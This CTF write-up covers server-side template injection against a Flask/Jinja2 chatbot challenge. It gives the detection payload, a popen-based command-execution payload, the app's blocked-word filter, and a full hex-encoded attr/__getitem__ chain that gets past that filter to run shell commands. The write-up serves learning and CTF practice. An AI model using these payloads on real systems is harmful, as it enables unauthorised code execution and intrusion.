# description -> I thought building chatbots would be easy... Seems like my chatbot doesn't understand much.

**No sorce code was provided at this challenge**

## link -> http://34.132.132.69:8006/

**The main page of the website is this**

![image](https://github.com/qlashx/ctf_writeups/assets/106611511/05b2e505-16fe-4fa8-92fd-30eb6487a12e)

**I began contemplating Server-Side Template Injection (SSTI) because my input was being reflected. Additionally, the absence of a bot meant there was no immediate risk of someone following a malicious link to execute XSS and steal cookies. 😄**

**Initially, I injected the standard SSTI payload, which is {{7*7}}, and observed the output displaying 49.**

![image](https://github.com/qlashx/ctf_writeups/assets/106611511/e37a23bc-9ff2-4476-ae3e-a6957288bb12)

**Let's begin the process of determining the backend programming language in use.**

**I initiated the process by inducing errors in the application, attempting to access unintended paths and observing the resulting output.** 

![image](https://github.com/qlashx/ctf_writeups/assets/106611511/010408cf-0c01-4792-9f3d-f6ddc6a49f79)

**So, this error indicates the usage of Python Flask in the backend.**

**Now, let's determine the template engine that is currently in use.** 

**We can employ hacktrick tips (I suggest utilizing them) for assistance.**

**After spending some time interacting with the app, I determined that it is using Jinja2 as the template engine.**

**Let's utilize a basic payload from hacktricks. I employed the following payload: {{ cycler.__init__.__globals__.os.popen('id').read() }}.**

**And this marked the app's response - life is not easy. 😕** 

![image](https://github.com/qlashx/ctf_writeups/assets/106611511/9e6da4db-7316-43f0-8954-d870feac3450)

**Now, our task is to discover the words that this app restricts or blocks.**

**After spending some time interacting with the app, I discovered that it blocks certain words, including ".", "cycler," and also prohibits the use of square brackets [].**

**We require a method to inject a period (.) and square brackets [] without being blocked by the app. Additionally, we need a way to insert the restricted words.**

**After conducting some research, I came across a writeup (link provided below) that utilized a function called attr (a built-in filter in Flask). This function enables concatenation between two values and also understands hexadecimal encoding. This can be our workaround to bypass the blocked words and the period (.). For instance, our payload might look like "sau"|attr("hexvaluees").**

**Additionally, we need a method to represent square brackets ([]). Luckily, there's a function called getitem that we can leverage to select items from the returned array.**

**So, our current objective is to transform the following code: "sai".__class__.__base__.__subclasses__()[147].__init__.__globals__['sys'].modules['os'].popen("hostname").read() using the upper functions for bypassing.**

**it will be like this after convertion {{"sai"|attr("\x5F\x5F\x63\x6C\x61\x73\x73\x5F\x5F")|attr("\x5F\x5F\x62\x61\x73\x65\x5F\x5F")|attr("\x5F\x5F\x73\x75\x62\x63\x6C\x61\x73\x73\x65\x73\x5F\x5F")()|attr("\x5f\x5fgetitem\x5f\x5f")(183)|attr("\x5F\x5F\x69\x6E\x69\x74\x5F\x5F")|attr("\x5F\x5F\x67\x6C\x6F\x62\x61\x6C\x73\x5F\x5F")|attr("\x5f\x5fgetitem\x5f\x5f")('sys')|attr("\x6D\x6F\x64\x75\x6C\x65\x73")|attr("\x5f\x5fgetitem\x5f\x5f")('os')|attr("\x70\x6F\x70\x65\x6E")("ls")|attr("\x72\x65\x61\x64")()}}**

**and pingo we can use it to get rce and read the flag**

![image](https://github.com/qlashx/ctf_writeups/assets/106611511/982240ef-22dd-45c8-9f65-75923e3fb44a)

used writeup link -> https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f




